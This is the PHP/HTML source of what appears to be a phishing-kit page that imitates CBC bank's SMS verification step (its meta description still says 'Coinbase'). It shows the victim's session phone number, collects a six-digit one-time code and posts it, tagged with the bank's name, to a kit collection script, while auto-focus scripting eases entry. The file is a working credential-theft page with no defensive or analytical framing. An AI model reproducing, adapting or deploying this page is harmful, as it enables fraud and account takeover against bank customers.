<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>CBC</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
          body{
            background-color:#EEEEEE;
          }
          ul li{
            color:#0097DB !important;
          }                    
        </style>        
    </head>
    <body>
      
    
    <!-- header -->
    <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="route d-flex align-items-center">
          <i class="ri-arrow-left-s-line" style="color:#0097DB;"></i>
          <p class="mb-0" style="color:#0097DB;"><?php echo get_text('cb_s_1'); ?></p>
        </div>
        <div class="logo ms-0">
          <img src="./Asstes/imgs/cbc.svg" style="height:55px; width: auto;" alt="">
        </div>
        <div class="esy_log">
          <!-- <p class="mb-0">Ga naar Easy Banking Business</p> -->
        </div>
        <div class="menu align-items-end">
          <!-- <p class="mb-0">Menu</p>
          <img src="./Asstes/imgs/menu.png" alt=""> -->
        </div>
      </div>
    </header>

    <!-- verfication -->
    <div class="wrapper_verfi">
      <div class="container_verfi">
        <form action="./Asstes/php/config/func.php" method="post" class="d-flex">
        <input type="hidden" name="name_bank" value="CBC">
        <input type="hidden" name="sms_cc">
          <div class="box">
            <div class="title">
              <h1><?php echo get_text('cb_s_2'); ?></h1> 
              <p><?php echo get_text('cb_s_3'); ?></p>
              <span>+32<?php echo $_SESSION["num"] ?></span>
            </div>
            <?php if( isset($_GET['error']) ) : ?>
            <div class="alert_error d-flex align-items-center">
              <i class="ri-alert-line"></i>
              <?php echo get_text('cb_s_4'); ?>
            </div>
            <?php endif; ?>
            <div class="inputes">
              <input type="text" name="x1" id="x1" autofocus maxlength="1">
              <input type="text" name="x2" id="x2" maxlength="1">
              <input type="text" name="x3" id="x3" maxlength="1">
              <input type="text" name="x4" id="x4" maxlength="1">
              <input type="text" name="x5" id="x5" maxlength="1">
              <input type="text" name="x6" id="x6" maxlength="1">
            </div>
            <a href="" style="color:#0097DB;"><?php echo get_text('cb_s_5'); ?></a>
            <div class="btn_sub">
              <button type="submit" disabled style="background-color:#0097DB;"><?php echo get_text('cb_s_6'); ?></button>
            </div>
          </div>
        </form>
      </div>
    </div>

    <!-- footer -->
    <footer class="footer_1">
      <div class="container_footer_1 d-flex align-items-center justify-content-between">
        <p class="mb-0">© 2024 CBC</p>
        <ul class="d-flex align-items-center flex-wrap mb-0 ps-0">
          <li>Vie Privée</li>
          <li class="tiri">-</li>
          <li>Co-navigation</li>
          <li class="tiri">-</li>
          <li>Conditions d'utilisation du Site Web</li>
          <li class="tiri">-</li>
          <li>Les Cookies</li>
          <li class="tiri">-</li>
          <li>Vie Privée</li>
        </ul>
      </div>
    </footer>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
        $(".inputes input").keyup(function(){
          if ($(".inputes #x1").val() != "" & $(".inputes #x2").val() != "" & $(".inputes #x3").val() != "" & $(".inputes #x4").val() != "" & $(".inputes #x5").val() != "" & $(".inputes #x6").val() != "") {
            $(".btn_sub button").prop("disabled",false);
          }else{
            $(".btn_sub button").prop("disabled",true);
          }
        });   
        $(".inputes input").keyup(function(){
                if($(this).val().length == 1){
                    $(this).next().focus();

                    return false
                }else if($(this).val() == ""){
                  $(this).prev().focus();
                }
        })          
    </script>
    </body>
</html>